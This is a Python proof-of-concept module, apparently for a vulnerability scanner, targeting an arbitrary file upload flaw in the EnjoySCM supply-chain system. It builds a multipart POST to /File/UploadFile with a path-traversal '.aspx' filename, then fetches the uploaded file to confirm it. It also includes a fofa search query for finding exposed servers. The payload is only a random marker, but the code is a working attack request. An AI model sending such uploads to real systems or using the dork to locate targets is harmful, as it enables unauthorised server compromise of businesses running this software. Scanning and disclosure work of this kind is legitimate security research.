# coding:utf-8  
import requests
from lib.core.common import url_handle,get_random_ua,random_str
from lib.core.poc import POCBase
# ...
import urllib3
urllib3.disable_warnings()

class POC(POCBase):

    _info = {
        "author" : "jijue",                      # POC作者
        "version" : "1",                    # POC版本，默认是1  
        "CreateDate" : "2022-01-01",        # POC创建时间
        "UpdateDate" : "2022-01-01",        # POC创建时间
        "PocDesc" : """
        略  
        """,                                # POC描述，写更新描述，没有就不写

        "name" : "EnjoySCM UploadFile任意文件上传漏洞",                        # 漏洞名称
        "VulnID" : "oFx-2022-0001",                      # 漏洞编号，以CVE为主，若无CVE，使用CNVD，若无CNVD，留空即可
        "AppName" : "EnjoySCM",                     # 漏洞应用名称
        "AppVersion" : "",                  # 漏洞应用版本
        "VulnDate" : "2022-01-01",                    # 漏洞公开的时间,不知道就写今天，格式：xxxx-xx-xx
        "VulnDesc" : """
            enjoyscm是国内部分超市使用的一种供应链管理系统。
            enjoyscm UploadFile参数存在 任意文件上传漏洞，攻击者通过漏洞可以获取服务器权限。
        """,                                # 漏洞简要描述

        "fofa-dork":"""
            title="供应商网上服务厅"
        """,                     # fofa搜索语句
        "example" : "",                     # 存在漏洞的演示url，写一个就可以了
        "exp_img" : "",                      # 先不管  
    }

    def _verify(self):
        """
        返回vuln

        存在漏洞：vuln = [True,html_source] # html_source就是页面源码  

        不存在漏洞：vuln = [False,""]
        """
        vuln = [False,""]

        file_flag = random_str(length=6,chars="str")
        content_flag = random_str(length=15,chars="str int")

        url0 = self.target + "/File/UploadFile" # url自己按需调整

        headers = {
                    "User-Agent":get_random_ua(),
                    "Connection":"close",
                    "X-Requested-With": "XMLHttpRequest",
                    "Content-Type": "multipart/form-data; boundary=---------------------------21909179191068471382830692394",
                    }
        data0 = """
-----------------------------21909179191068471382830692394
Content-Disposition: form-data; name="file"; filename="../../../%s.aspx"
Content-Type: image/jpeg

%s
-----------------------------21909179191068471382830692394
Content-Disposition: form-data; name="action"

unloadfile
-----------------------------21909179191068471382830692394
Content-Disposition: form-data; name="filepath"


-----------------------------21909179191068471382830692394
""" % (file_flag,content_flag)
        url1 = self.target + "/%s.aspx" % (file_flag)
        try:
            """
            检测逻辑，漏洞存在则修改vuln值为True，漏洞不存在则不动
            """
            req0 = requests.post(url0,data=data0,headers = headers , proxies = self.proxy ,timeout = self.timeout,verify = False)
            req1 = requests.get(url1,headers = headers , proxies = self.proxy ,timeout = self.timeout,verify = False)
            if content_flag in req1.text:#req.status_code == 200 and :
                vuln = [True,req1.text]
            else:
                vuln = [False,req1.text]
        except Exception as e:
            raise e
        
        # 以下逻辑酌情使用
        if self._honeypot_check(vuln[1]) == True:
            vuln[0] = False
        
        return vuln

    def _attack(self):
        vuln = self._verify()

        return vuln